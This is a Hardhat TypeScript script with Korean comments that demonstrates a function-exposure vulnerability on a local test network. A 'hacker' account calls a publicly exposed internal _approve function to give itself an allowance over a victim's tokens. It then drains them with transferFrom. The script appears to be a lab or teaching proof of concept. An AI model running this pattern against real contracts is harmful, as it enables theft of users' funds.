// npx hardhat run scripts/Exploit1_FunctionExposure.ts --network hardhat
import {ethers} from "hardhat";

async function main() {
    const [owner, victim, hacker] = await ethers.getSigners();

    // proxyContract 배포
     const proxyContract = await ethers.deployContract("ProxyTargetContract");
     const proxyAddress = await proxyContract.getAddress();

    // targetContract 배포
     const targetContract = await ethers.deployContract("TargetContract", [
        owner, // constructor 인자
        proxyAddress,
     ])
     const targetAddress = await targetContract.getAddress();

     console.log("Proxy address:", proxyAddress);
     console.log("Target address: ", targetAddress);

    // owner 주소로 mint(victim.address, 1.0) 실행
     await targetContract
        .connect(owner)
        .mint(victim.address, ethers.parseEther("1.0"));

    // hacker 주소로 balance(victim.address) 실행하여 victim의 이더량 확인
    console.log(
        "victim's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(victim.address)
        )
    );

    // hacker에게 victim이 허용하는 Ether의 양
    console.log(
        "hacker's allowance of victim: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .allowance(victim.address, hacker.address)
        )
    );

    // 노출된 _approve 함수를 이용하여 hacker에게 victim이 허용하는 Ether의 양 조작
    await targetContract
        .connect(hacker)
        ._approve(victim.address, hacker.address, ethers.parseEther("1.0"));

    // hacker에게 victim이 허용하는 Ether의 양
    console.log(
        "hacker's allowance of victim: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .allowance(victim.address, hacker.address)
        )
    );

    // victim의 이더 뺐어오기
    await targetContract
        .connect(hacker)
        .transferFrom(victim.address, hacker.address, ethers.parseEther("1.0"));

    // hacker 주소로 balance(hacker.address) 실행하여 victim의 이더량 확인
    console.log(
        "hacker's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(hacker.address)
        )
    );

    // hacker 주소로 balance(victim.address) 실행하여 victim의 이더량 확인
    console.log(
        "victim's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(victim.address)
        )
    );
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
})